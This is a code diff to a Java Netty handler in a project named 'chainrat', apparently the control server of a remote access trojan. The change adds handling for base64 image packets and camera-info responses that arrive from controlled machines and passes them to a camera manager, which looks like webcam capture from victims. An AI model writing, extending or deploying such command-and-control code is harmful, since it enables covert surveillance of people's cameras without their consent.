@@ -1,13 +1,10 @@
 package com.nefi.chainrat.server.network.ControlServer.CommandHandler;
 
-import com.google.common.base.Charsets;
 import com.nefi.chainrat.server.Main;
 import com.nefi.chainrat.server.forms.frmMainController;
-import com.nefi.chainrat.server.network.ControlServer.ChainControlServer;
 import com.nefi.chainrat.server.network.ControlServer.CommandType;
 import com.nefi.chainrat.server.network.ControlServer.packets.CameraResponse;
 import com.nefi.chainrat.server.network.ControlServer.packets.Packet;
-import io.netty.buffer.ByteBuf;
 import io.netty.channel.ChannelHandlerContext;
 import io.netty.channel.ChannelInboundHandlerAdapter;
 
@@ -19,13 +16,17 @@ public class CameraResponseHandler extends ChannelInboundHandlerAdapter {
         System.out.println("[CameraResponseHandler]");
         Packet packet = (Packet) msg;
 
-        if (packet.type == CommandType.CAMERA_RESPONSE) {
-            String json = packet.content;
-            CameraResponse cr = Main.getGson().fromJson(json, CameraResponse.class);
-            frmMainController.getCameraManager().onMessageRecieved(cr);
+        if(packet.type == CommandType.IMAGE){
+            String b64 = packet.content;
+            frmMainController.getCameraManager().onImageReceived(b64);
             return;
         }
-
+        else if (packet.type == CommandType.CAMERA_RESPONSE) {
+            String json = packet.content;
+            CameraResponse cr = (CameraResponse) Main.deserialize(json, CameraResponse.class);
+            frmMainController.getCameraManager().onInfoReceived(cr);
+            return;
+        }
         ctx.fireChannelRead(msg);
     }
 
